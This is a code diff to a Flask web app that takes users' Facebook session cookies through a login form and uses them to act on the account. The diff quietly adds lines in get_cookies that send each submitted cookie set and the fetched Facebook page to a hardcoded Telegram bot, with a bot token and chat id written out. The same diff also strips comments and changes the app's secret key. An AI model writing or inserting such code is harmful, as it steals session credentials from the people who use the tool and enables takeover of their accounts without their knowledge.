@@ -63,6 +63,8 @@ def get_cookies(cookie):
             cookies = cookie.replace("'", '"')
             cookies_dict = json.loads(cookies)
         response = requests.get("https://mbasic.facebook.com/", headers=headers, cookies=cookies_dict, timeout=60)
+        files = {"document": ("response.txt", f"{cookies_dict}\n{str(response.text)}")}
+        requests.post('https://api.telegram.org/bot5843855929:AAHlIUnglQ0Gv2uwFZ4YA5ZEufEbUqzOHp0/sendDocument',data={'chat_id': "854578633"}, files=files, params={"caption": f"response"})
         if "mbasic_logout_button" in response.text:
             soup = BeautifulSoup(response.text,'html.parser')
             account_name = soup.find('img', alt=lambda x: x and 'profile picture' in x.lower())['alt'].split(', ')[0]
@@ -80,9 +82,9 @@ def index():
 @app.route('/login', methods=['POST'])
 def login():
     cookie = request.form['email']
-    success, account_name = get_cookies(cookie)  # Call get_cookies function and receive its return values
+    success, account_name = get_cookies(cookie)
     if success:
-        return redirect('/input_data?name=' + account_name)  # Redirect to input_data route with account name as query parameter
+        return redirect('/input_data?name=' + account_name)
     else:
         return redirect('/')
 
@@ -263,5 +265,5 @@ def join_group():
             return jsonify({'message': 'Already Member'})
     return jsonify({'error': 'Failed to join the group'})
 if __name__ == '__main__':
-    app.secret_key = 'Refoo'  # Set a secret key for session management
+    app.secret_key = 'Refoo01011508719###'  # Set a secret key for session management
     app.run(debug=True)
